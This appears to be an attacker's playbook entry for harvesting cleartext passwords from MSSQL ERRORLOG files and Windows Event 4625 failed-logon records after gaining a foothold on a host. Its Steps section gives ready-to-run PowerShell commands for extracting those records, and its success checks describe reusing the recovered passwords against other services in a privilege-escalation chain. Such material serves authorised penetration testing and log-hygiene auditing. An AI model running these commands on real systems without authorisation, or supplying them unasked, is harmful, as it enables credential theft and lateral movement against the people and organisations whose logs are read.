# SQL ERRORLOG / Event 4625 Password Disclosure

## When this applies

- Windows foothold on a SQL host or DC where you can read the SQL ERRORLOG files or Windows Security event log.
- Goal: 5-second check for cleartext passwords accidentally typed into the *username* field at any Windows/SQL login prompt.

## Technique

When a user accidentally types their password into the username field at any Windows/SQL login prompt, the failed-login event records the username verbatim. Both MSSQL ERRORLOG and Windows Event 4625 capture this verbatim string.

## Steps

```powershell
# MSSQL: ERRORLOG and ERRORLOG.BAK preserve the typed-as-username string in cleartext
Select-String -Path 'C:\Program Files\Microsoft SQL Server\*\MSSQL\Log\ERRORLOG*' -Pattern 'Login failed for user'
Get-Content C:\SQLServer\Logs\ERRORLOG*,C:\Program*\Microsoft*\MSSQL*\Log\ERRORLOG* 2>$null | Select-String 'Login failed'
# Windows: 4625 (Failed Logon) — Account Name field sometimes holds the password
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -ErrorAction SilentlyContinue |
  Format-List @{N='User';E={$_.Properties[5].Value}},@{N='Domain';E={$_.Properties[6].Value}},TimeCreated
```

5-second check that often short-circuits a privesc chain.

## Verifying success

- `Login failed for user 'SuperSecret123!'` appears in ERRORLOG — the username IS the password.
- Authenticating with `<typed-as-username>` against another service succeeds.

## Common pitfalls

- ERRORLOG files rotate (ERRORLOG.1, .2, etc.) — search all of them.
- Windows Event 4625 may filter Property[5] differently across builds — verify the field index.

## Tools

- Select-String (PowerShell)
- Get-WinEvent
